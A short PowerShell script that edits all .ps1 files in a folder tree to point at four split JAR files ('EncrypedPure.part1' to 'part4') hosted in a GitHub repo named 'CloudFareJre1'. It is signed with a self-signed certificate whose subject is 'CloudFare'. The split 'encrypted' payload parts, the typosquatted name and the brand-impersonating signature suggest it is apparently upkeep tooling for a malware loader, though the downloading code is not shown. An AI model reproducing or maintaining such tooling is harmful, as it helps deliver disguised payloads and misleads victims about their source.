# Update all GitHub URLs to consistent format
$baseUrl = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main"

$replacements = @(
    @{ Old = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part1.jar"; New = "$baseUrl/EncrypedPure.part1.jar" },
    @{ Old = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part2.jar"; New = "$baseUrl/EncrypedPure.part2.jar" },
    @{ Old = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part3.jar"; New = "$baseUrl/EncrypedPure.part3.jar" },
    @{ Old = "https://raw.githubusercontent.com/davidrenand/CloudFareJre1/main/EncrypedPure.part4.jar"; New = "$baseUrl/EncrypedPure.part4.jar" }
)

$files = Get-ChildItem -Filter "*.ps1" -Recurse

Write-Host "UPDATING ALL GITHUB URLS" -F Cyan
Write-Host ""

foreach ($file in $files) {
    $content = Get-Content $file.FullName -Raw
    $modified = $false
    
    foreach ($replacement in $replacements) {
        if ($content -like "*$($replacement.Old)*") {
            $content = $content -replace [regex]::Escape($replacement.Old), $replacement.New
            $modified = $true
        }
    }
    
    if ($modified) {
        $content | Set-Content $file.FullName
        Write-Host "[OK] $($file.Name)" -F Green
    }
}

Write-Host ""
Write-Host "COMPLETE" -F Green


# SIG # Begin signature block
# MIIFWwYJKoZIhvcNAQcCoIIFTDCCBUgCAQExCzAJBgUrDgMCGgUAMGkGCisGAQQB
# gjcCAQSgWzBZMDQGCisGAQQBgjcCAR4wJgIDAQAABBAfzDtgWUsITrck0sYpfvNR
# AgEAAgEAAgEAAgEAAgEAMCEwCQYFKw4DAhoFAAQU7DQ+6OWUZOHANvTazSVqwCmu
# n/mgggL8MIIC+DCCAeCgAwIBAgIQFEA8i6m7gZ5GA+AtSKCeIjANBgkqhkiG9w0B
# AQsFADAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwHhcNMjUxMTI3MTY0NjI1WhcNMzAx
# MTI3MTY1NjI1WjAUMRIwEAYDVQQDDAlDbG91ZEZhcmUwggEiMA0GCSqGSIb3DQEB
# AQUAA4IBDwAwggEKAoIBAQCwcOS5Unea33JuYXDoorRS8MRt7/sCwNRSDcdRUz7N
# fb1NjESMXbkE/rLcapbH8DhYfpX59h0Cp0ROdfgcQSxitCOqn5zGIOThKOHUW18x
# wJnOBM1lRrvZfoNun1cSgYnE1BQX+2FlrCjeHRUCkYo/KuCYlHjSD7W4BWwPGXPJ
# ofCbFhX909qbXblZt6jJBoTni8MNC+Bizfv302qhVAh+0CWCCsYYhcNAWXj+qb0t
# 9EvQHGQT6c2weIanGEcIMDwjO0/sldunBEVJBhe8TXeF/3wfn1rGAzqOgvYXFvd/
# J9eeO/Oeo+BDNBRwPcVHmO02vK7RCUJqR3Ub7pBNVbBpAgMBAAGjRjBEMA4GA1Ud
# DwEB/wQEAwIHgDATBgNVHSUEDDAKBggrBgEFBQcDAzAdBgNVHQ4EFgQU4eXXKcu5
# 5PGlisHTXHU95ihdYyMwDQYJKoZIhvcNAQELBQADggEBAHRZGGdVylXjYignpkSf
# 5ctiETsIscLuQTJJ1URT67Y+0x7xbcD9474OCUuTIEZh9wPL2HSmoNrDY7qxMKc4
# qCwxwoWQAWmLLcxgytJ8qpi2vZaExBDgODwU3LIA3uNu3iCmHbu8ISF68T1HR2+c
# 7cn1wn/C3XZOVhOW8CVjIpltD01LujsoauH8eRg93R6q3Z5yJ+5WJDNYzl6Y2xGL
# 9UQ4Xv7y8+wXES809v5+e/2kQL/NWwd3hOB6/176mfaT15ZZHBys1pYOJBHiMO9v
# W5IImNwQ/eXXzUrppVnCQ6fLm5GyTKqGq14cMahma6K8r9lrgvkLI1VS1ue0La5l
# 5MAxggHJMIIBxQIBATAoMBQxEjAQBgNVBAMMCUNsb3VkRmFyZQIQFEA8i6m7gZ5G
# A+AtSKCeIjAJBgUrDgMCGgUAoHgwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZ
# BgkqhkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYB
# BAGCNwIBFTAjBgkqhkiG9w0BCQQxFgQUXJnpSWwaXruoUI63cwfKkIAKHgYwDQYJ
# KoZIhvcNAQEBBQAEggEAfibLdGpoeLx4LDhoQQXHZw1+xDzRhuToaHfLQ0iVRNgw
# MTNqF9e6h4D8u4H+t+i2yLB7uV8bOF1h6lNi19Ur6tVVSOTagooJ6sZvWm61XOjx
# AMaxaxLI/aO9JFV0M5ehBp2kUnm3eAWae2CQe6/Auwx8oC9bx9VWwFWOVfhkYRVv
# YuoEf1DZwvgh0EhHKna3TZgAnzt//rwwNvsAUlAADLR6xQVyh3BJQd953iOOw2yC
# hoFFu1a0n5VO1vM7PEJ8ARcfSbQiRQXah1vDzagvkrOeKQoe79A17iHIwQiuxZcQ
# Zj/4NljTzUVpWzasHGZPdGR0GtXSg01vWdr57tbk3A==
# SIG # End signature block
